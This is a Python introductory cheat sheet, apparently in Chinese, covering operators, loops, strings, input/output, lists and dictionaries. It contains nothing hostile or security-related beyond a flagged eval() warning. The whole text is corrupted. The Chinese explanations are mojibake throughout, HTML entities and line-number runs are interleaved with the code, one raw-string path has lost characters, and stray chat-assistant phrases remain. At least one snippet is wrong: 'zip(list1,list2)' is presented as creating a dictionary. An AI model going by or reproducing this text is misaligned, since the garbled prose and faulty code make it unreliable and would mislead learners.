floatï¼šåŒç²¾åº¦æµ®ç‚¹ï¼Œå¦‚ 3.14ã€6.02e23ã€‚ complexï¼šå½¢å¦‚ 3+4jï¼Œå«å®éƒ¨å’Œè™šéƒ¨ã€‚ 0.5.2 ä¸€å…ƒè¿ç®—ä¸å¸¸ç”¨å‡½æ•° è¿ç®—/å‡½æ•° è¾“å…¥ ç»“æœ ç¤ºä¾‹ +x / -x æ•°å­— åŸå€¼ / ç›¸åæ•° -5 abs(x) æ•°å­— ç»å¯¹å€¼ abs(-3) â†’ 3 round(x, n) æµ®ç‚¹ å››èˆå…­å…¥äº”é å¶ï¼›n ä¸ºä¿ç•™ä½æ•° round(3.1416, 2) â†’ 3.14 int(x) / float(x) æ•°å­—æˆ–å¯è½¬æ¢å­—ç¬¦ä¸² ç±»å‹è½¬æ¢ int(3.9) â†’ 3 divmod(a,b) ä¸¤æ•´æ•° (a//b, a%b) äºŒå…ƒç»„ divmod(17,4) â†’ (4,1) 0.5.3 äºŒå…ƒè¿ç®—ç¬¦ è¿ç®—ç¬¦ å«ä¹‰ ç¤ºä¾‹ ç»“æœ + - * / åŠ å‡ä¹˜é™¤ï¼ˆ/ è¿”å› floatï¼‰ 7/2 3.5 // åœ°æ¿é™¤ï¼ˆå‘è´Ÿæ— ç©·å–æ•´ï¼‰ -7//2 -4 % å–ä½™ 7%2 1 ** å¹‚è¿ç®— 2**10 1024 pow(x,y[,m]) å¹‚ï¼Œå¯å¸¦æ¨¡ pow(2,10,1000) 24 `\u0026laquo; \u0026raquo; \u0026amp; ^ ~` ä½è¿ç®— 5\u0026lt;\u0026lt;1 0.5.4 math æ ‡å‡†åº“é€ŸæŸ¥ 1 2 3 4 5 6 import math math.sqrt(9) # 3.0 å¼€æ ¹ math.ceil(2.3) # 3 ä¸Šå–æ•´ math.floor(2.9) # 2 ä¸‹å–æ•´ math.factorial(5) # 120 é˜¶ä¹˜ math.pi, math.e # åœ†å‘¨ç‡å’Œè‡ªç„¶å¸¸æ•° éœ€è¦é«˜ç²¾åº¦æ—¶ï¼Œä½¿ç”¨ from decimal import Decimalï¼›å¤„ç†åˆ†æ•°å¯ç”¨ from fractions import Fractionã€‚\n0.5.5 ç²¾åº¦é™·é˜±ä¸è§£å†³åŠæ³• 1 2 3 0.1 + 0.1 + 0.1 == 0.3 # False from decimal import Decimal as D D(\u0026#39;0.1\u0026#39;)*3 == D(\u0026#39;0.3\u0026#39;) # True 0.5.6 å°æŠ€å·§ ç¯ç»•å–æ¨¡ï¼šå‡¯æ’’åç§» (idx + k) % 26ã€‚ä¾‹2ï¼šæŠŠè¾“å…¥çš„æ•°å­—æ˜ å°„åˆ°æ˜ŸæœŸï¼š\n1 2 3 week = [\u0026#39;æ—¥\u0026#39;,\u0026#39;ä¸€\u0026#39;,\u0026#39;äºŒ\u0026#39;,\u0026#39;ä¸‰\u0026#39;,\u0026#39;å››\u0026#39;,\u0026#39;äº”\u0026#39;,\u0026#39;å…­\u0026#39;] i = int(input(\u0026#39;è¾“å…¥æ•°å­—ï¼ˆä»»æ„æ•´æ•°ï¼‰ï¼š\u0026#39;)) % 7 print(\u0026#39;æ˜ŸæœŸ\u0026#39; + week[i]) å–åä½ï¼šn // 10 % 10ï¼›ï¼ˆ//ç•™é«˜ä½ %ç•™ä½ä½ï¼‰ åä¸‰ä½ï¼šn % 1000ã€‚\nå•†ä½™åŒå¾—ï¼šq, r = divmod(n, m)ã€‚\n0.6 åˆ†æ”¯æ§åˆ¶ä¸å¾ªç¯ 0.6.1 æ¯”è¾ƒä¸é€»è¾‘è¿ç®—ç¬¦ ç±»å‹ ç¬¦å· å«ä¹‰ è¯»æ³• / è®°å¿†å°æŠ€å·§ ç¤ºä¾‹ æ¯”è¾ƒ == ç›¸ç­‰ \u0026ldquo;ä¸¤ä¸ªç­‰å·è¡¨ç¤ºæ¯”è¾ƒ\u0026rdquo; 5 == 5 â†’ True != ä¸ç­‰ \u0026ldquo;! è¡¨ç¤º notï¼Œå’Œ == ç»„åˆæˆ â‰ \u0026rdquo; 5 != 3 â†’ True \u0026gt; å¤§äº \u0026ldquo;å°–å˜´å‘å·¦ï¼Œå·¦è¾¹æ›´å¤§\u0026rdquo; 5 \u0026gt; 3 â†’ True \u0026lt; å°äº \u0026ldquo;å°–å˜´å‘å³ï¼Œå³è¾¹æ›´å¤§\u0026rdquo; 3 \u0026lt; 5 â†’ True \u0026gt;= å¤§äºç­‰äº è¯»ä½œ \u0026ldquo;å¤§äºç­‰äº\u0026rdquo;ï¼Œå†™ä½œ \u0026gt;=ï¼ˆè®°ï¼šå…ˆ \u0026gt; å =) 5 \u0026gt;= 5 â†’ True \u0026lt;= å°äºç­‰äº è¯»ä½œ \u0026ldquo;å°äºç­‰äº\u0026rdquo;ï¼Œå†™ä½œ \u0026lt;=ï¼ˆè®°ï¼šå…ˆ \u0026lt; å =) 3 \u0026lt;= 5 â†’ True é€»è¾‘ and ä¸ ä¸¤è¾¹éƒ½çœŸæ‰çœŸ True and False â†’ False or æˆ– ä¸€çœŸå³çœŸ True or False â†’ True not é å–å not True â†’ False çœŸå€¼è§„åˆ™ï¼š0ã€None, False ä¸ºå‡ï¼Œå…¶ä»–çš†çœŸã€‚\n0.6.2 if / elif / else 1 2 3 4 5 6 7 score = 85 if score \u0026gt;= 90: grade = \u0026#39;A\u0026#39; elif score \u0026gt;= 80: grade = \u0026#39;B\u0026#39; else: grade = \u0026#39;C or below\u0026#39; ä¸‰å…ƒè¡¨è¾¾å¼ï¼šgender = 'ç”·' if isBoy(me) else 'å¥³'ã€‚ 0.6.3 å¾ªç¯ç»“æ„ while 1 2 3 4 5 6 7 n = 1 while n \u0026lt; 100: n *= 2 if n == 64: break # æå‰ç»“æŸå¾ªç¯ else: print(\u0026#39;æ­£å¸¸ç»“æŸ\u0026#39;) # æœªè¢« break æ—¶æ‰æ‰§è¡Œ for 1 2 for i in range(0, 5,1): print(i) # 0,1,2,3,4 éå†å­—å…¸ï¼šfor k,v in d.items():(æ›´å¤šè¯·çœ‹ä¸‹é¢)ã€‚\nrange(start, stop, step) ä¸å« stopï¼Œstep å¯ä¸ºè´Ÿã€‚\nåŒæ—¶éå†ä¸¤ä¸ªåºåˆ—ï¼š\n1 2 for a, b in zip(list1, list2): ... æ¨å¯¼å¼ 1 2 3 squares = [x*x for x in range(10) if x%2==0] odd_map = {x: x%2 for x in range(5)} unique = {c.lower() for c in \u0026#39;Hello\u0026#39;} 0.6.4 å¾ªç¯ç›¸å…³è¯­å¥ breakï¼šé€€å‡ºæœ€è¿‘ä¸€å±‚å¾ªç¯ã€‚ continueï¼šè·³è¿‡æœ¬æ¬¡è¿­ä»£ï¼Œç»§ç»­ä¸‹ä¸€æ¬¡ã€‚ passï¼šå ä½è¯­å¥ï¼Œä»€ä¹ˆéƒ½ä¸åšã€‚ 0.6.5 å¸¸è§å‘ æµ®ç‚¹æ¯”è¾ƒï¼šç”¨ abs(a-b) \u0026lt; 1e-9ã€‚ ä¿®æ”¹åˆ—è¡¨æ—¶éå†ï¼šå¯å…ˆå¤åˆ¶ for x in lst[:] æˆ–å€’åºéå†ã€‚ æ­»å¾ªç¯ï¼šç¡®ä¿å¾ªç¯ä½“å†…æœ‰è®©æ¡ä»¶å˜å‡çš„è¯­å¥ã€‚ åç»­ç« èŠ‚ï¼šæ–‡ä»¶ I/Oã€Numpy \u0026amp; Pandas ç®€æ˜æŒ‡å—â€¦\nåˆ†æ”¯ï¼ˆif / elif / elseï¼‰ 1 2 3 4 5 6 if æ¡ä»¶è¡¨è¾¾å¼: # ä»£ç å— elif å¦ä¸€ä¸ªæ¡ä»¶: # ä»£ç å— else: # ä»£ç å— æ¡ä»¶è¡¨è¾¾å¼ç”±æ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆ== != \u0026gt; \u0026lt; \u0026lt;= \u0026gt;=ï¼‰å’Œé€»è¾‘è¿ç®—ç¬¦ï¼ˆnot and orï¼‰ç»„åˆè€Œæˆã€‚ ç¦æ­¢åœ¨æ¡ä»¶ä¸­ç”¨æµ®ç‚¹æ•°åˆ¤æ–­ç›¸ç­‰ï¼Œæ˜“å‡ºé”™ã€‚å¿…è¦æ—¶ç”¨æ•´æ•°æˆ–é˜ˆå€¼èŒƒå›´åˆ¤æ–­ã€‚ å¯ä»¥å†™ if x in some_list æˆ– if key in some_dictã€‚ å¾ªç¯ 1 2 3 4 5 6 7 # while å¾ªç¯ while æ¡ä»¶: # ä»£ç å— # for å¾ªç¯ for i in iterable: # iterable å¯ä¸ºå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€range ç­‰ # ä»£ç å— range(start, end, step)ï¼šåŒ…å« startï¼Œä¸åŒ…å« endï¼Œæ­¥é•¿ stepã€‚\néå†å­—å…¸ï¼š\nfor k, v in d.items(): for k in d.keys(): for v in d.values(): åˆ—è¡¨æ¨å¯¼å¼ï¼š\n1 new_list = [f(x) for x in iterable if æ¡ä»¶] 0x1 æ•°æ®ç»“æ„ä¸æ–‡ä»¶æ“ä½œ 1.0 å­—ç¬¦ä¸² 1.0.1 å®šä¹‰å­—ç¬¦ä¸² å•å¼•å·æˆ–åŒå¼•å·åŒ…è£¹ï¼š\n1 2 a = \u0026#34;hello\u0026#34; b = \u0026#39;world\u0026#39; ä¸‰å¼•å·ç”¨äºå¤šè¡Œæ–‡æœ¬ï¼š\n1 2 3 4 text = \u0026#34;\u0026#34;\u0026#34; ç¬¬ä¸€è¡Œ ç¬¬äºŒè¡Œ \u0026#34;\u0026#34;\u0026#34; åŸå§‹å­—ç¬¦ä¸²ï¼ˆä¸å¤„ç†è½¬ä¹‰ï¼‰ï¼š\n1 path = r\u0026#34;C:ew_folder\test\u0026#34; 1 2 3 4 5 6 7 8 9 10 - å¸¸ç”¨è½¬ä¹‰ç¬¦ï¼š ` `ï¼ˆæ¢è¡Œï¼‰ã€`\t`ï¼ˆåˆ¶è¡¨ï¼‰ã€`\\`ï¼ˆåæ–œæ æœ¬èº«ï¼‰ã€‚ ## 1.0.2 å­—ç¬¦ä¸²æ ¼å¼åŒ– - **f-string**ï¼ˆPython 3.6+ï¼‰ï¼š ```python name = \u0026#34;Alice\u0026#34; score = 95.6789 msg = f\u0026#34;{name} åŒå­¦æˆç»©ï¼š{score:.2f}\u0026#34; # ä¿ç•™ä¸¤ä½å°æ•° **format()** æ–¹æ³•ï¼š\n1 2 3 template = \u0026#34;{0} åŒå­¦æˆç»©ï¼š{1:.2f}\u0026#34;.format(name, score) # æˆ–æŒ‡å®šåç§° template2 = \u0026#34;{n} æˆç»©ï¼š{s:.1f}\u0026#34;.format(n=name, s=score) å¸¸è§æ ¼å¼è¯´æ˜ï¼š\n:.2f ä¿ç•™ä¸¤ä½å°æ•°ã€‚ :\u0026gt;10 å³å¯¹é½ï¼Œå  10 ä¸ªå­—ç¬¦å®½åº¦ã€‚ :\u0026lt;10 å·¦å¯¹é½ã€‚ :^10 å±…ä¸­å¯¹é½ã€‚ 1.0.3 åˆ‡ç‰‡ä¸ç´¢å¼•è·å– æŒ‰ç´¢å¼•è®¿é—®å•ä¸ªå­—ç¬¦ï¼š\n1 2 3 s = \u0026#34;python\u0026#34; s[0] # \u0026#39;p\u0026#39; s[-1] # \u0026#39;n\u0026#39; åˆ‡ç‰‡ï¼ˆ[start:stop:step]ï¼‰ï¼š\n1 2 3 4 5 6 s = \u0026#34;abcdefg\u0026#34; s[1:4] # \u0026#39;bcd\u0026#39; (åŒ…å«ç´¢å¼•1ï¼Œä¸åŒ…å«4) s[:3] # \u0026#39;abc\u0026#39; s[3:] # \u0026#39;defg\u0026#39; s[::2] # \u0026#39;aceg\u0026#39; (æ­¥é•¿2) s[::-1] # \u0026#39;gfedcba\u0026#39; (åè½¬) 1.0.4 å¸¸ç”¨å­—ç¬¦ä¸²æ–¹æ³• é‡è¦æç¤ºï¼š å­—ç¬¦ä¸²åœ¨ Python ä¸­æ˜¯ ä¸å¯å˜ çš„â€”â€”å‡ ä¹æ‰€æœ‰æ–¹æ³•éƒ½ä¼šè¿”å› æ–°å­—ç¬¦ä¸²ï¼ŒåŸå˜é‡ä¿æŒä¸å˜ã€‚åˆ«å¿˜äº†æŠŠè¿”å›å€¼æ¥æ”¶è¿›å˜é‡ï¼Œå¦åˆ™ä½ çš„ä¿®æ”¹ä¼šâ€œä¸¢å¤±â€ã€‚\næ ¸å¿ƒæ–¹æ³•è¯¦è§£ len(s) â†’ int ä½œç”¨ï¼šè¿”å›é•¿åº¦ã€‚ è¿”å›å€¼ï¼šæ•´æ•°ã€‚åŸå­—ç¬¦ä¸²ä¸å˜ã€‚ s.upper() / s.lower() â†’ str ä½œç”¨ï¼šå¤§å°å†™è½¬æ¢ã€‚ è¿”å›å€¼ï¼šæ–°å­—ç¬¦ä¸²ï¼›s æœ¬èº«ä¸å˜ã€‚ s.find(sub, start=0, end=len) â†’ int ä½œç”¨ï¼šå­ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ è¿”å›å€¼ï¼šç´¢å¼•ï¼›æœªæ‰¾åˆ°è¿”å› -1ã€‚ s.replace(old, new, count=-1) â†’ str ä½œç”¨ï¼šæŠŠæ‰€æœ‰ï¼ˆæˆ–å‰ count ä¸ªï¼‰old æ¢æˆ newã€‚ è¿”å›å€¼ï¼šæ–°å­—ç¬¦ä¸²ï¼›ä¸ä¼šå°±åœ°ä¿®æ”¹ã€‚ s.split(sep=None, maxsplit=-1) â†’ list[str] ä½œç”¨ï¼šæŒ‰åˆ†éš”ç¬¦æ‹†æˆåˆ—è¡¨ï¼›é»˜è®¤æŒ‰ç©ºç™½æ‹†ã€‚ è¿”å›å€¼ï¼šåˆ—è¡¨ï¼›åŸå­—ç¬¦ä¸²ä¸å˜ã€‚ sep.join(iterable) â†’ str ä½œç”¨ï¼šæŠŠè¿­ä»£å™¨é‡Œçš„å…ƒç´ ç”¨ sep è¿æ¥ã€‚ è¿”å›å€¼ï¼šæ–°å­—ç¬¦ä¸²ã€‚ å°æŠ€å·§ï¼š' '.join(['Hello', 'Python']) â†’ 'Hello Python'ã€‚ s.strip(chars=None) / lstrip / rstrip â†’ str ä½œç”¨ï¼šå»æ‰ä¸¤ç«¯æˆ–å·¦/å³ä¾§æŒ‡å®šå­—ç¬¦ï¼ˆé»˜è®¤ç©ºç™½ï¼‰ã€‚ è¿”å›å€¼ï¼šæ–°å­—ç¬¦ä¸²ã€‚ åˆ¤æ–­ç±»æ–¹æ³•ï¼ˆè¿”å› boolï¼‰ï¼š s.isalpha()ï¼šå…¨æ˜¯å­—æ¯ã€‚ s.isdigit()ï¼šå…¨æ˜¯æ•°å­—ã€‚ s.isalnum()ï¼šå­—æ¯æˆ–æ•°å­—ã€‚ s.startswith(prefix) / s.endswith(suffix)ï¼šå‰ç¼€/åç¼€åˆ¤æ–­ã€‚ å…¶ä»–å¸¸ç”¨æ ¼å¼åŒ–/å˜å½¢ï¼š s.title()ï¼šæ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ã€‚ s.capitalize()ï¼šé¦–å­—æ¯å¤§å†™ï¼Œå…¶ä½™å°å†™ã€‚ åˆ‡ç‰‡åè½¬ï¼šs[::-1]ã€‚ s.strip() # å»é™¤é¦–å°¾ç©ºç™½ s.lstrip() # å»é™¤å·¦ä¾§ç©ºç™½ s.rstrip() # å»é™¤å³ä¾§ç©ºç™½ ä¾‹å­æ±‡æ€» 1 2 3 4 5 6 7 8 9 10 s = \u0026#34; hello, python3 \u0026#34; print(len(s)) # 15 print(s.strip().upper()) # \u0026#39;HELLO, PYTHON3\u0026#39; print(s.find(\u0026#39;py\u0026#39;)) # 8 print(s.replace(\u0026#39;python3\u0026#39;, \u0026#39;world\u0026#39;)) # \u0026#39; hello, world \u0026#39; print(\u0026#39;-\u0026#39;.join([\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;,\u0026#39;C\u0026#39;])) # \u0026#39;A-B-C\u0026#39; # å­—ç¬¦ç¼–ç äº’è½¬ print(ord(\u0026#39;A\u0026#39;)) # 65 ï¼ˆå­—ç¬¦â†’ç ç‚¹ï¼‰ print(chr(9731)) # \u0026#39;â˜ƒ\u0026#39; ï¼ˆç ç‚¹â†’å­—ç¬¦ï¼‰ 1.0.5 è¾“å…¥ä¸è¾“å‡º input() 1 2 3 4 5 6 name = input(\u0026#34;è¯·è¾“å…¥å§“åï¼š\u0026#34;) # å§‹ç»ˆè¿”å› str age = int(input(\u0026#34;å¹´é¾„ï¼š\u0026#34;)) # è½¬æˆ int x, y = input().split() # ç”¨ç©ºæ ¼åˆ†å‰²æˆä¸¤ä¸ªå˜é‡ï¼ˆstrï¼‰ a, b = map(float, input().split()) # map(ç±»å‹, å¯è¿­ä»£) â†’ map å¯¹è±¡ï¼Œéœ€è¦å†å¤–å±‚è½¬æ¢ nums = list(map(int, input().split())) # å…ˆ map å† list å¾—åˆ°æ•´æ•°åˆ—è¡¨ c, d = eval(input()) # è¾“å…¥å½¢å¦‚ \u0026#34;(3,4)\u0026#34;ï¼›âš ï¸ eval æœ‰å®‰å…¨é£é™© map(func, iterable) ä¼šè¿”å› **map** å¯¹è±¡ï¼ˆæƒ°æ€§è¿­ä»£å™¨ï¼‰ï¼Œå¸¸è§ç”¨æ³•æ˜¯å†åŒ…ä¸€å±‚ list()ã€tuple() æˆ–ç›´æ¥ç”¨åœ¨ for å¾ªç¯é‡Œï¼šfor x in map(int, data): ...ã€‚ input(prompt) åœ¨æ§åˆ¶å°æ˜¾ç¤ºæç¤ºæ–‡å­—ï¼Œç­‰å¾…ç”¨æˆ·æ•²å›è½¦ã€‚ è¿”å›å€¼æ°¸è¿œæ˜¯å­—ç¬¦ä¸²ï¼Œéœ€è¦æ—¶è‡ªè¡Œç”¨ int() / float() / split() ç­‰è½¬æ¢ã€‚ print() 1 2 3 4 print(\u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34;) # é»˜è®¤ç©ºæ ¼åˆ†éš”ï¼Œæ¢è¡Œç»“æŸ print(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, sep=\u0026#34;-\u0026#34;, end=\u0026#34;! \u0026#34;) # è‡ªå®šä¹‰åˆ†éš”ç¬¦ä¸ç»“å°¾ print(f\u0026#34;{name=}\u0026#34;) # è°ƒè¯•åˆ©å™¨ï¼ŒPython 3.8+ å…³é”®å­—å‚æ•°ï¼š sepï¼šå¤šä¸ªå‚æ•°ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤ ' 'ã€‚ endï¼šè¡Œå°¾ç»“æŸç¬¦ï¼Œé»˜è®¤ ' 'ï¼›æ”¹æˆ '' å¯å–æ¶ˆè‡ªåŠ¨æ¢è¡Œã€‚ fileï¼šè¾“å‡ºç›®æ ‡ï¼Œé»˜è®¤ sys.stdoutï¼›å¯é‡å®šå‘åˆ°æ–‡ä»¶å¯¹è±¡ã€‚ flushï¼šTrue æ—¶ç«‹å³åˆ·æ–°ç¼“å†²åŒºã€‚ å°è´´å£«ï¼šprint(*iterable, sep=' ') å¯å¿«é€Ÿé€è¡Œæ‰“å°åˆ—è¡¨å†…å®¹ã€‚\n1.0.6 map() 1 2 3 4 5 6 pythonå¤åˆ¶ç¼–è¾‘# å°†ç”¨æˆ·è¾“å…¥çš„æ•°å­—ç”¨ç©ºæ ¼åˆ†éš”å¹¶è½¬æ¢æˆ int a, b, c = map(int, input(\u0026#34;è¾“å…¥ 3 ä¸ªæ•´æ•°ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼š\u0026#34;).split()) # è¯´æ˜ï¼š # map(ç±»å‹, å¯è¿­ä»£å¯¹è±¡) â†’ è¿”å›ä¸€ä¸ª map å¯¹è±¡ï¼ˆæƒ°æ€§è¿­ä»£å™¨ï¼‰ # æƒ³ç«‹å³å¾—åˆ°åˆ—è¡¨å¯å†å¥—ä¸€å±‚ list() nums = list(map(float, input().split())) å°ç»“\nmap() ä¸ä¼šç«‹åˆ»äº§ç”Ÿæ–°åˆ—è¡¨ï¼Œè€Œæ˜¯è¿”å› map å¯¹è±¡ï¼›å¦‚æœè¦å¤šæ¬¡ä½¿ç”¨ï¼Œæœ€å¥½ list(map(...))ã€‚ eval(input()) èƒ½ä¸€æ¬¡è¯»å¤šä¸ª Python è¡¨è¾¾å¼å¹¶ç›´æ¥å˜æˆå¯¹åº”ç±»å‹ï¼Œä½†æœ‰ å®‰å…¨éšæ‚£ï¼›è€ƒè¯•èƒ½ç”¨å°±ç”¨ï¼Œå¼€å‘åˆ«éšä¾¿ç”¨ã€‚ 1.1 åˆ—è¡¨ 1.1.1 åˆ›å»ºæ–¹å¼ 1 2 3 4 5 empty = [] # å­—é¢é‡ç©ºåˆ—è¡¨ empty2 = list() # æ„é€ å‡½æ•° mix = [1, 2, \u0026#34;3\u0026#34;] # æ··åˆç±»å‹ copy = [a, b] # å­˜å˜é‡æ—¶åªå­˜â€œå¼•ç”¨â€ï¼Œä¸ä¼šè¿å¸¦ä¿®æ”¹å†å²å€¼ matrix = [[0]*3 for _ in range(2)] # 2Ã—3 äºŒç»´è¡¨ï¼Œæ¨èåˆ—è¡¨æ¨å¯¼å¼ 1.1.2 è®¿é—®ä¸åˆ‡ç‰‡ 1 2 3 4 v = mix[0] # ç¬¬ 1 ä¸ªï¼Œä¸‹æ ‡ä» 0 å¼€å§‹ last = mix[-1] # å€’æ•°ç¬¬ 1 ä¸ª sub = mix[1:3] # [start, end) åˆ‡ç‰‡ rev = mix[::-1] # åè½¬ 1.1.3 å¸¸ç”¨ç»Ÿè®¡å‡½æ•° 1 2 3 4 5 n = len(nums) # é•¿åº¦ s = sum(nums) # æ±‚å’Œï¼ˆå…ƒç´ éœ€å¯ç›¸åŠ ï¼‰ avg = s / n # å¹³å‡å€¼ hi, lo = max(nums), min(nums) nums_sorted = sorted(nums) # è¿”å›â€œæ–°åˆ—è¡¨â€ 1.1.4 ä¿®æ”¹ä¸ç®¡ç†æ–¹æ³• æ–¹æ³•è°ƒç”¨ ä½œç”¨ å°±åœ°ä¿®æ”¹ï¼Ÿ è¿”å›å€¼ lst.append(x) åœ¨å°¾éƒ¨åŠ ä¸€ä¸ªå…ƒç´  âœ… None lst.extend(it) è¿½åŠ ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡é‡Œçš„æ‰€æœ‰å…ƒç´  âœ… None lst.insert(i, x) åœ¨ç´¢å¼• i å¤„æ’å…¥ âœ… None lst.pop(i=-1) åˆ é™¤å¹¶è¿”å›ç´¢å¼• iï¼ˆé»˜è®¤æœ€åä¸€ä¸ªï¼‰ âœ… è¢«å¼¹å‡ºçš„å…ƒç´  lst.remove(x) åˆ  ç¬¬ä¸€ä¸ª å€¼ç­‰äº x çš„å…ƒç´  âœ… None lst.clear() æ¸…ç©ºåˆ—è¡¨ âœ… None lst.index(x) è¿”å› x ç¬¬ä¸€æ¬¡å‡ºç°çš„ç´¢å¼• âŒ int lst.count(x) ç»Ÿè®¡ x å‡ºç°æ¬¡æ•° âŒ int lst.sort(key=None, reverse=False) åŸåœ°æ’åº âœ… None lst.reverse() åŸåœ°åè½¬ âœ… None sort() vs sorted()ï¼šlst.sort() ä¼šç›´æ¥æ”¹å˜åŸåˆ—è¡¨ä¸”è¿”å› Noneï¼›sorted(lst) åˆ™ç”Ÿæˆæ–°åˆ—è¡¨å¹¶ä¿æŒåŸåˆ—è¡¨ä¸å˜ã€‚ ä¸å¯å˜å¯¹è±¡ï¼ˆå¦‚å­—ç¬¦ä¸²ï¼‰æ”¾è¿›åˆ—è¡¨åï¼Œåˆ—è¡¨é‡Œåªæ˜¯å­˜â€œå¼•ç”¨â€ï¼Œè‹¥å¯¹è±¡æœ¬èº«ä¸å¯å˜å°±å®‰å…¨ï¼›å¯å˜å¯¹è±¡ï¼ˆå¦‚å¦ä¸€ä¸ªåˆ—è¡¨ï¼‰è‹¥åœ¨åˆ«å¤„ä¿®æ”¹ï¼Œä¼šåæ˜ åˆ°è¿™é‡Œã€‚ è¿™æ ·ä¸€æ¥ï¼Œæ•°å­—â€‘å­—ç¬¦ä¸²â€‘åˆ—è¡¨ä¸‰å¤§â€œæœ€å¸¸ç”¨åŸºæœ¬ç±»å‹â€å°±éƒ½æœ‰å®Œæ•´é€ŸæŸ¥äº†ã€‚ å¦‚æœè¿˜æƒ³å†è¡¥å…¶å®ƒå®¹å™¨ï¼ˆå¦‚å…ƒç»„ã€å­—å…¸ï¼‰æˆ–æ·±å…¥è®² sort() çš„è‡ªå®šä¹‰ keyï¼Œéšæ—¶è¯´ï¼\n##â€¯1.2â€¯å­—å…¸ï¼ˆdictï¼‰\n###â€¯1.2.1â€¯åˆ›å»ºä¸èµ‹å€¼\n1 2 3 4 5 6 7 8 9 10 11 12 # ç©ºå­—å…¸ d1 = {} # å­—é¢é‡ d2 = dict() # æ„é€ å‡½æ•° d2=zip(list1,list2) #ç”¨åˆ—è¡¨æ„é€  å–æœ€çŸ­ ç¬¬ä¸€ä¸ªæ˜¯é”® # å¸¦å†…å®¹ info = {\u0026#34;name\u0026#34;: \u0026#34;Tom\u0026#34;, \u0026#34;age\u0026#34;: 18} ## å¦‚æœé‡å¤ åé¢çš„ä¼šè¦†ç›–å‰é¢çš„ # åŠ¨æ€æ·»åŠ  / ä¿®æ”¹ info[\u0026#34;city\u0026#34;] = \u0026#34;Beijing\u0026#34; # å¦‚æœ key ä¸å­˜åœ¨å°±åˆ›å»ºï¼Œå­˜åœ¨å°±æ”¹å€¼ # æ¨å¯¼å¼ squares = {x: x**2 for x in range(5)} # {0:0, 1:1, 2:4, â€¦} é”®å¿…é¡»å”¯ä¸€ï¼Œè€Œä¸”å¿…é¡»æ˜¯å¯å“ˆå¸Œçš„ä¸å¯å˜å¯¹è±¡ï¼ˆæ•°å­—ã€å­—ç¬¦ä¸²ã€å…ƒç»„â€¦ï¼‰ã€‚\n###â€¯1.2.2â€¯å®‰å…¨å–å€¼ ç›´æ¥ d[key]â€¯è‹¥é”®ä¸å­˜åœ¨ä¼šæŠ› KeyErrorã€‚å¸¸è§ä¸¤ç§â€œç¨³å–â€å†™æ³•ï¼š\n1 2 3 4 if \u0026#34;age\u0026#34; in info: # å…ˆåˆ¤æ–­ print(info[\u0026#34;age\u0026#34;]) print(info.get(\u0026#34;score\u0026#34;, 0)) # è‹¥æ— åˆ™ç»™é»˜è®¤ 0 ###â€¯1.2.3â€¯å¸¸ç”¨æ–¹æ³•é€ŸæŸ¥\nè°ƒç”¨ ä½œç”¨ è¿”å›å€¼ å¤‡æ³¨ d.get(k, default=None) å–å€¼ æ‰¾åˆ°ï¼šå€¼ï¼›æ²¡æ‰¾åˆ°ï¼šdefault ä¸æŠ¥é”™ d.pop(k, default=KeyError) åˆ é™¤å¹¶è¿”å›é”®â€¯k æ‰¾ä¸åˆ°ï¼šKeyError æˆ– default å°±åœ°æ”¹ d.keys() / d.values() / d.items() åˆ†åˆ«æ‹¿åˆ°é”® / å€¼ / (é”®,å€¼) è¿­ä»£å™¨ dict_keys ç­‰ å¯è½¬ list() d.update(other) ç”¨â€¯otherâ€¯é‡Œçš„é”®å€¼æ‰¹é‡æ›´æ–° None å°±åœ°æ”¹ d.clear() æ¸…ç©ºå­—å…¸ None å°±åœ°æ”¹ len(d) é”®çš„ä¸ªæ•° int å†…ç½®å‡½æ•° ###â€¯1.2.4â€¯éå†å¥—è·¯\n1 2 3 4 5 6 7 # éå†é”® for k in info: print(k, info[k]) #ï¼ï¼é»˜è®¤åªéå†é”® # åŒæ—¶æ‹¿é”®å’Œå€¼ for k, v in info.items(): print(f\u0026#34;{k} --\u0026gt; {v}\u0026#34;) ###â€¯1.2.5â€¯å­—å…¸æ’åº\næŒ‰é”®æ’åºï¼ˆæœ€ç®€å•ï¼‰\n1 2 for k in sorted(info): # é»˜è®¤å‡åº print(k, info[k]) æŒ‰å€¼æ’åº\n1 2 # sorted() æ¥æ”¶ key=ï¼Œè¿”å›çš„æ˜¯æ–°åˆ—è¡¨ items = sorted(info.items(), key=lambda kv: kv[1]) # æŒ‰ value å‡åº å¤šçº§æ’åº lambda è¿”å› å…ƒç»„ â†’ å…ˆæ¯”ç¬¬ä¸€é¡¹ï¼Œå†æ¯”ç¬¬äºŒé¡¹ï¼š\n1 2 # å…ˆæŒ‰ value é™åºï¼Œå†æŒ‰ key å‡åº items = sorted(info.items(), key=lambda kv: (-kv[1], kv[0])) å¦‚æœæƒ³å¯¹ã€Œå¤šçº§å…ƒç»„æ’åºã€å†æ•´ä½“åè½¬ï¼Œè¯·ä¸è¦å†™ sorted(..., reverse=True) â€”â€” è¿™æ ·ä¼šæŠŠæ‰€æœ‰ç»´åº¦ä¸€èµ·ç¿»è½¬ï¼› æ­£ç¡®åšæ³•ï¼š\nå…ˆå†™å¥½å¸¦æ­£è´Ÿå·çš„å¤šçº§ keyï¼› æˆ–è€…å…ˆæ’å¥½ï¼Œå†è°ƒç”¨ä¸€æ¬¡ items.reverse()ã€‚ ###â€¯1.2.6â€¯lambdaâ€¯ä¸€å£è®²æ¸…\nlambda å‚æ•°: è¡¨è¾¾å¼ â†’ åŒ¿åå°å‡½æ•°ï¼Œç”¨ä¸€æ¬¡å°±ä¸¢ã€‚\nåœ¨ sorted, map, filter ç­‰åœºæ™¯ä¸‹å½“â€œå›è°ƒâ€æœ€å¸¸è§ã€‚\n1 2 # æŠŠå­—å…¸æŒ‰ value ä»å¤§åˆ°å°æ’ sorted(info.items(), key=lambda kv: kv[1], reverse=True) å°è´´å£«\nå­—å…¸å…ƒç´ æ— åºï¼ˆPythonâ€¯3.7+ 